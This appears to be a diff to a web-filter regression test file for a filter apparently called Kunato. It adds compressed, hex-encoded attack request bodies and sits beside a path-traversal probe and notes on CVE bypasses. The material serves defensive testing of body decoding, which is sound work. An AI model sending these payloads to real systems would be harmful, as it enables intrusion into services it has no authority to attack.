@@ -3641,3 +3641,12 @@ GET /en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C
 # CVE-2024-28397 (js2py): library sandbox escape with no request shape.
 # CVE-2024-28255 note: probes carry the path-parameter bypass; full SpEL
 #   exfiltration needs an attacker-controlled callback.
+
+# --- Compressed body inspection regression ---
+# The same attack classes wrapped in Content-Encoding and content-type
+# encodings; Kunato must decode them for rule matching while forwarding the
+# original bytes unchanged.
+POST /api/search header="Content-Encoding: gzip" bodyhex=1f8b08000000000002032bb4355428cdcbcccf53284ecd494d2e5128482c2e2ecf2f4a51482bcacf55282d4e2d2a0600919f6f7924000000
+POST /api/login header="Content-Encoding: deflate" bodyhex=789c53a9ceca4bc9b4ca49492cb0d2d74f2c29494cce4e2dd24bad48cc2dc849d54fac0500cab60c2e
+POST /api/comment header="Content-Encoding: br" bodyhex=1b1800f8a5535e6278242186949220fc524c89e958
+POST /api/search header="Content-Encoding: gzip" header="Content-Type: application/x-www-form-urlencoded" bodyhex=1f8b08000000000002032bb4553532d72ecdcbcccfd32e4ecd494d2ed1360400b051cb0214000000
